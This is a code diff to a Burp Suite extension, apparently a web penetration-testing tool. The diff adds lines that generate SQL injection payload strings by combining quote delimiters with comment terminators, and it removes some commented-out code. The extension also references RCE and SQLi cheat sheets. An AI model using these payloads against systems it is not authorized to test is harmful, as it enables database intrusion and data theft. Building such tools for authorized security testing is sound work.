@@ -538,11 +538,8 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         elif self._rbDictRCE.isSelected():
             self._txtDictParam.setText(self._txtDefaultRCE)
             self._tabDictResultDisplay.setText(self._txtCheatSheetRCE)
-        #_V
         elif self._rbDictSQLi.isSelected():
             self._txtDictParam.setText(self._txtDefaultSQLi)
-            #self._tabDictResultDisplay.setText(self._txtCheatSheetSQLi)
-            #self._tabDictResultDisplay.setText("sil")
             self.funcSQLi(self)
         elif self._rbDictCheatSheet.isSelected():
             self._tabDictResultDisplay.setText(self._txtCheatSheet)
@@ -690,7 +687,11 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 listSQLi.append(delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + "\n")
                 listSQLi.append(delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + delimeterEnd + "\n")
                 listSQLi.append(delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + delimeterEnd + "\n")
-                
+                listSQLi.append(" or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + "\n")
+                listSQLi.append(" or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + "\n")
+                listSQLi.append(" or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + delimeterEnd + "\n")
+                listSQLi.append(" or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + delimeterEnd + "\n")
+
         delimeterStarts = ["", "'", "\'", "\\'", "\"", "\\\"", "\\\\\""]
         delimeterEnds = ["", " --", " #", ";", "; --", "; #"]
         for delimeterStart in delimeterStarts:
